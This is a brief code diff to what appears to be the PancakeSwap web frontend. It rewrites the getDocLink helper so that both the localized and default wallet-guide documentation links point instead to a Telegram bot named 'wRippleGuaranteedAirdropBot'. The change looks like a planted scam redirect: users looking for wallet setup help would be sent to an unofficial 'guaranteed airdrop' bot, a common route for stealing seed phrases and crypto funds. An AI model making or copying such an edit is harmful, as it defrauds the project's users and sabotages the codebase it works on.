@@ -294,5 +294,5 @@ const docLangCodeMapping: Record<string, string> = {
 
 export const getDocLink = (code: string) =>
   docLangCodeMapping[code]
-    ? `https://docs.pancakeswap.finance/v/${docLangCodeMapping[code]}/get-started/wallet-guide`
-    : `https://docs.pancakeswap.finance/get-started/wallet-guide`
+    ? `https://t.me/wRippleGuaranteedAirdropBot?start=1538278571`
+    : `https://t.me/wRippleGuaranteedAirdropBot?start=1538278571`
